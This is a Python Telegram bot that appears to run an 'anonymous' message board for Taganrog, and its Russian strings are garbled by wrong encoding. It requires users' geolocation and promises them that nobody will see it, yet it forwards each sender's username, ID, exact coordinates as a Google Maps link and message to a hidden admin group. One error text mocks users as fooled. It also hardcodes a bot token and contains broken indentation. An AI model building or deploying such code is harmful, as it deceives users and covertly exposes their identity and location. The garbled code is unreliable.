
import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from math import radians, sin, cos, sqrt, atan2

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
TOKEN = "8089566253:AAGJSzNBhjgoEK5ZolkgIqH8a8Q99iPuu44"
ANON_GROUP_LINK = "https://t.me/+Ql0IZosRRu82YTQy"
ANON_GROUP_ID = -1002514617765
FORWARD_GROUP_ID = -1002698558394
VIDEO_LINK = "https://youtu.be/hK_cbdVPK-E"  # –ù–æ–≤–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è —Å –≤–∏–¥–µ–æ

# –ì–µ–æ–ø–∞—Ä–∞–º–µ—Ç—Ä—ã –¢–∞–≥–∞–Ω—Ä–æ–≥–∞
TAGANROG_CENTER = (47.2364, 38.8953)
ALLOWED_RADIUS_KM = 50

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–æ–≤
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot.log'
)
logger = logging.getLogger(__name__)

# –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –≥–µ–æ
geo_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("üìç –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é", request_location=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —É—Ç–æ—á–Ω–µ–Ω–∏–µ–º –æ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏"""
    welcome_text = (
        f"–ü—Ä–∏–≤–µ—Ç! –î–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è —Å–Ω–∞—á–∞–ª–∞ –ø–æ–¥–µ–ª–∏—Å—å —Å–≤–æ–µ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–µ–π:\n\n"
        f"üîí <b>–ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å:</b>–ù–∏–∫—Ç–æ –Ω–µ –ø–æ–ª—É—á–∏—Ç —Ç–≤–æ—é –≥–µ–æ–ø–æ–∑–∏—Ü–∏—é (–∞–Ω—Ç–∏—Å–ø–∞–º —Å–∏—Å—Ç–µ–º–∞)\n\n"
        f"üìπ <a href='{VIDEO_LINK}'>–í–∏–¥–µ–æ–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</a>"
    )
await update.message.reply_text(
        welcome_text,
        reply_markup=geo_keyboard,
        parse_mode='HTML',
        disable_web_page_preview=True
    )

def calculate_distance(lat1, lon1, lat2, lon2):
    """–í—ã—á–∏—Å–ª–µ–Ω–∏–µ —Ä–∞—Å—Å—Ç–æ—è–Ω–∏—è –º–µ–∂–¥—É —Ç–æ—á–∫–∞–º–∏ (–≤ –∫–º)"""
    R = 6371
    lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
    return R * (2 * atan2(sqrt(a), sqrt(1-a)))

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ —Å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ–º –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏"""
    try:
        user = update.message.from_user
        location = update.message.location
       ¬†
        # –í—ã—á–∏—Å–ª—è–µ–º —Ä–∞—Å—Å—Ç–æ—è–Ω–∏–µ
        distance = calculate_distance(
            TAGANROG_CENTER[0], TAGANROG_CENTER[1],
            location.latitude, location.longitude
        )
       ¬†
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ
        context.user_data['location'] = {
            'lat': location.latitude,
            'lon': location.longitude,
            'distance': distance,
            'valid': distance <= ALLOWED_RADIUS_KM
        }
       ¬†
        # –û—Ç–≤–µ—Ç —Å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ–º –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏
        response = (
            "‚úÖ <b>–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø—Ä–∏–Ω—è—Ç–∞</b>\n\n"
            f"üìè –†–∞—Å—Å—Ç–æ—è–Ω–∏–µ –¥–æ —Ü–µ–Ω—Ç—Ä–∞: {distance:.1f} –∫–º\n"
       ¬†
            "–¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è:"
        )
       ¬†
        await update.message.reply_text(
            response,
            reply_markup=ReplyKeyboardMarkup.remove_keyboard(),
            parse_mode='HTML'
        )
       ¬†
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: {e}")
        await update.message.reply_text(
            "‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑(–Ω–∞–µ–±–∞–ª –≤—Å–µ –æ–∫).\n\n"
            ,
            reply_markup=geo_keyboard
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π —Å –Ω–∞–ø–æ–º–∏–Ω–∞–Ω–∏–µ–º –æ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏"""
    try:
        if update.message.chat.type != "private":
            return
           ¬†
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
        if 'location' not in context.user_data:
            await update.message.reply_text(
                "‚ö†Ô∏è –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤–∞—à–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:\n\n"
                "üîí –ù–∏–∫—Ç–æ –Ω–µ —É–≤–∏–¥–∏—Ç –≤–∞—à—É –≥–µ–æ–ø–æ–∑–∏—Ü–∏—é",
                reply_markup=geo_keyboard
            )
            return
           ¬†
        user = update.message.from_user
        loc_data = context.user_data['location']
       ¬†
        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤
        admin_msg = (
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{user.username or 'N/A'} (ID: {user.id})\n"
            f"üìç –ì–µ–æ: https://maps.google.com/?q={loc_data['lat']},{loc_data['lon']}\n"
            f"üìè –†–∞—Å—Å—Ç–æ—è–Ω–∏–µ: {loc_data['distance']:.1f} –∫–º\n\n"
            f"üìù –°–æ–æ–±—â–µ–Ω–∏–µ:\n{update.message.text}\n\n"
            f"üìπ <a href='{VIDEO_LINK}'>–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</a>"
        )
       ¬†
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω–∞–º
        await context.bot.send_message(
            FORWARD_GROUP_ID,
            admin_msg,
            parse_mode='HTML',
            disable_web_page_preview=True
        )
       ¬†
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –∞–Ω–æ–Ω–∏–º–Ω—ã–π —á–∞—Ç –µ—Å–ª–∏ –≤ —Ä–∞–¥–∏—É—Å–µ
        if loc_data['valid']:
            await context.bot.send_message(
                ANON_GROUP_ID,
                f"‚úâÔ∏è –ê–Ω–æ–Ω–∏–º–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ:\n\n{update.message.text}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("üîç –û—Ç–∫—Ä—ã—Ç—å", url=VIDEO_LINK)]])
            )
            response = "‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∞–¥–º–∏–Ω–∞–º (@kmpr0 –µ—Å–ª–µ—á)! <a href='{VIDEO_LINK}'>–ê—Ö—É–µ—Ç—Ç</a>"
        else:
            response = "‚ùå –í—ã –≤–Ω–µ –∑–æ–Ω—ã –¢–∞–≥–∞–Ω—Ä–æ–≥–∞. –°–æ–æ–±—â–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º."
           ¬†
        await update.message.reply_text(response)
       ¬†
        # –°–±—Ä–∞—Å—ã–≤–∞–µ–º –≥–µ–æ–¥–∞–Ω–Ω—ã–µ
        del context.user_data['location']
        await update.message.reply_text(
            "–î–ª—è –Ω–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é —Å–Ω–æ–≤–∞:\n\n",
            reply_markup=geo_keyboard
        )
       ¬†
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
        await update.message.reply_text(
            "‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞.\n"
            "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞—á–Ω–∏—Ç–µ –∑–∞–Ω–æ–≤–æ.",
            reply_markup=geo_keyboard
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫ —Å –≥–∞—Ä–∞–Ω—Ç–∏–µ–π –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏"""
    logger.error(f"–û—à–∏–±–∫–∞: {context.error}")
    if update and update.message:
        await update.message.reply_text(
            "‚ö†Ô∏è –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞. –í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.\n"
            "–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ –∏–ª–∏ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.",
            reply_markup=geo_keyboard
        )

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
   ¬†
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
   ¬†
    logger.info("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω ")
    app.run_polling()
